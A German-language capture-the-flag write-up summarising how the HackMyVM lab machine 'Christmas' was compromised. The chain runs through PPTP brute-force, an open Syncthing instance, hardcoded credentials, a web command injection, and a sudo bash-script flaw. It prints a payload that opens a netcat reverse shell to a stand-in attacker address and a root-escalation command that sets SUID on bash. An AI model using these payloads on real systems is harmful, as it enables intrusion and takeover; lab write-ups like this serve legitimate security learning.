# Christmas - HackMyVM (Hard)

![Christmas Icon](Christmas.png)

## Übersicht

*   **VM:** Christmas
*   **Plattform:** [HackMyVM](https://hackmyvm.eu/machines/machine.php?vm=Christmas)
*   **Schwierigkeit:** Hard
*   **Autor der VM:** DarkSpirit
*   **Datum des Writeups:** 29. Dezember 2023
*   **Original-Writeup:** https://alientec1908.github.io/Christmas_HackMyVM_Hard/
*   **Autor:** Ben C.

## Kurzbeschreibung

Die virtuelle Maschine "Christmas" von HackMyVM (Schwierigkeitsgrad: Hard) bot eine komplexe Herausforderung, die mehrere Eskalationsschritte erforderte. Der initiale Zugriff wurde durch einen Brute-Force-Angriff auf einen PPTP-VPN-Dienst erlangt, gefolgt von der Ausnutzung einer ungesicherten Syncthing-Instanz im internen Netzwerk, um an Quellcode mit hartkodierten Web-Login-Daten zu gelangen. Eine Command Injection-Schwachstelle in einer Admin-Funktion der Webanwendung ermöglichte dann eine Shell als `www-data`. Die weitere Eskalation erfolgte durch das Finden von Benutzer-Credentials in einer Konfigurationsdatei und schließlich durch die Ausnutzung einer fehlerhaften Bash-Skript-Logik in einer `sudo`-Regel, um Root-Rechte zu erlangen.

## Disclaimer / Wichtiger Hinweis

Die in diesem Writeup beschriebenen Techniken und Werkzeuge dienen ausschließlich zu Bildungszwecken im Rahmen von legalen Capture-The-Flag (CTF)-Wettbewerben und Penetrationstests auf Systemen, für die eine ausdrückliche Genehmigung vorliegt. Die Anwendung dieser Methoden auf Systeme ohne Erlaubnis ist illegal. Der Autor übernimmt keine Verantwortung für missbräuchliche Verwendung der hier geteilten Informationen. Handeln Sie stets ethisch und verantwortungsbewusst.

## Verwendete Tools

*   `arp-scan`
*   `vi` / `nano`
*   `nikto`
*   `nmap`
*   `gobuster`
*   `bash` (für Scripting)
*   `pptpsetup`
*   `ip`
*   `apt`
*   `syncthing`
*   `systemctl`
*   `unzip`
*   `ModHeader` (Browser Plugin)
*   `curl`
*   `nc` (netcat)
*   `script` (für Shell-Stabilisierung)
*   `ssh-keygen`, `ssh`
*   `openssl` (für Zufallszahlengenerierung im Exploit)
*   `tr`, `head`, `touch`
*   Standard Linux-Befehle (`cd`, `ls`, `cat`, `su`, `sudo`, `cp`, `chmod`, `id`)

## Lösungsweg (Zusammenfassung)

Der Angriff auf die Maschine "Christmas" gliederte sich in folgende Phasen:

1.  **Reconnaissance & Web Enumeration (Extern):**
    *   Identifizierung der Ziel-IP (`192.168.2.106`) via `arp-scan` und Eintrag als `christmas.hmv` in `/etc/hosts`.
    *   `nikto` und `nmap` zeigten offene Ports: 22 (SSH 9.2p1), 80 (Apache 2.4.57) und **1723** (PPTP). Nikto meldete fehlende Sicherheitsheader, Directory Indexing (`/assets/`, `/images/`), eine `robots.txt` und `/login.php`.
    *   `gobuster` fand weitere PHP-Dateien (`generic.php`, `elements.php`).
    *   `robots.txt` verwies auf `/webid`.
    *   Im Quellcode der Startseite wurde die E-Mail `admin@christmas.hmv` gefunden (potenzieller Benutzername).

2.  **Initial Access (PPTP & Syncthing):**
    *   Ein Bash-Skript (`vpncrack.sh`) wurde verwendet, um den PPTP-Dienst (Port 1723) mit dem Benutzernamen `admin` und einer Wortliste zu brute-forcen. Das Passwort `princesa` wurde gefunden.
    *   Nach erfolgreicher PPTP-Verbindung wurde das interne Netzwerk (`192.168.3.0/24`, Gateway `192.168.3.1`) gescannt.
    *   `nmap` auf `192.168.3.1` offenbarte interne Dienste, darunter **Syncthing** auf Port 8384 (Web-GUI) und 22000.
    *   Die Syncthing-Weboberfläche auf `http://192.168.3.1:8384` war ohne Passwort zugänglich.
    *   Die lokale Syncthing-Instanz des Angreifers wurde mit der Ziel-Instanz gekoppelt.
    *   Der Ordner `/srv/ftp` wurde auf der Ziel-Syncthing-Instanz für das Angreifer-Gerät freigegeben.
    *   Die Synchronisation brachte eine `backup.zip`-Datei zum Vorschein, die den Quellcode der Webanwendung enthielt.

3.  **Web Application Exploitation (Shell als www-data):**
    *   Analyse des entpackten Quellcodes von `login.php` enthüllte hartkodierte Zugangsdaten: `admin`:`MyPassword1@2023*`.
    *   Der Login-Prozess war mehrstufig:
        1.  Login auf `/login.php` mit `admin`:`MyPassword1@2023*` leitete zu `2fa.php`.
        2.  Um auf `/webid/admin/login.php` zuzugreifen, musste der `Referer`-Header auf `http://christmas.hmv/2fa.php` gesetzt werden (mit ModHeader).
        3.  Der Login auf `/webid/admin/login.php` erforderte `admin`:`MyPassword2@2023*` (vermutlich ebenfalls im Code gefunden oder erraten).
    *   Eine Command Injection-Schwachstelle wurde in `/webid/admin/categoriestrans.php` identifiziert.
    *   Mittels eines `curl`-Skripts wurde ein POST-Request gesendet, der den Payload `categories[123);system(\"nc -e /bin/bash ATTACKER_IP 4444\");/*]=test` enthielt. Authentifizierung wurde durch gesetzte Cookies und Referer simuliert.
    *   Eine Reverse Shell als Benutzer `www-data` wurde erfolgreich etabliert.

4.  **Privilege Escalation (www-data zu mr-jack):**
    *   Im Home-Verzeichnis von `mr-jack` (`/home/mr-jack/`) wurde die Datei `.config/.SecureGateway/firewall_config.conf` gefunden.
    *   Diese Datei enthielt Klartext-Zugangsdaten: `mr-jack`:`m3rrychr157m4523`.
    *   Mit `su mr-jack` und dem gefundenen Passwort wurde zum Benutzer `mr-jack` gewechselt.
    *   Die User-Flag wurde aus `/home/mr-jack/user.txt` gelesen.

5.  **Privilege Escalation (mr-jack zu root):**
    *   `sudo -l` für `mr-jack` zeigte: `(ALL : ALL) NOPASSWD: /opt/GiftPursuit`.
    *   Das Skript `/opt/GiftPursuit` verglich eine eingegebene Zahl mit einer zufällig generierten. Bei Übereinstimmung hätte es `chmod o+s /bin/bash` ausgeführt.
    *   Die Schwachstelle lag im Bash-Vergleich `[[ "${NUMBER}" -eq "${1}" ]]`. Durch Übergabe eines Arguments wie `'x[$(COMMAND)]'` wurde `COMMAND` via Command Substitution ausgeführt, *bevor* der arithmetische Vergleich fehlschlug.
    *   Der Exploit-Befehl war: `sudo /opt/GiftPursuit 'x[$(chmod +s /bin/bash)]'`.
    *   Dies setzte das SUID-Bit auf `/bin/bash`.
    *   Mit `/bin/bash -p` wurde eine Root-Shell erlangt (euid=0).
    *   Die Root-Flag wurde aus `/root/root.txt` gelesen.

## Wichtige Schwachstellen und Konzepte

*   **Schwache VPN-Passwörter:** Ermöglichte initialen Netzwerkzugriff via PPTP Brute-Force.
*   **Ungesicherte Syncthing-Instanz:** Zugriff auf die Web-GUI ohne Passwort ermöglichte Dateisynchronisation und Exfiltration von Quellcode.
*   **Hartkodierte Credentials:** Passwörter direkt im PHP-Quellcode und in Konfigurationsdateien.
*   **Fehlerhafte Authentifizierung/Autorisierung:** Komplexer, fehleranfälliger Login-Prozess mit Referer-Abhängigkeit.
*   **Command Injection:** In der Webanwendung (`categoriestrans.php`) durch unsichere Verarbeitung von Benutzereingaben.
*   **Unsichere `sudo`-Konfiguration mit fehlerhaftem Skript:** Ein Bash-Skript mit einer Command-Substitution-Schwachstelle konnte missbraucht werden, um SUID-Rechte auf `/bin/bash` zu setzen.
*   **Directory Indexing & Informationslecks:** Offenlegung von Verzeichnisstrukturen und E-Mail-Adressen.

## Flags

*   **User Flag (`/home/mr-jack/user.txt`):** `caf45c355c29186bb9d8ab89f7811bf0`
*   **Root Flag (`/root/root.txt`):** `93ba7e97218f577271c3867abf31ae8a`

## Tags

`HackMyVM`, `Christmas`, `Hard`, `PPTP`, `VPN Brute-Force`, `Syncthing`, `Command Injection`, `Hardcoded Credentials`, `Sudo Privilege Escalation`, `Bash Script Exploitation`, `Web`, `Linux`
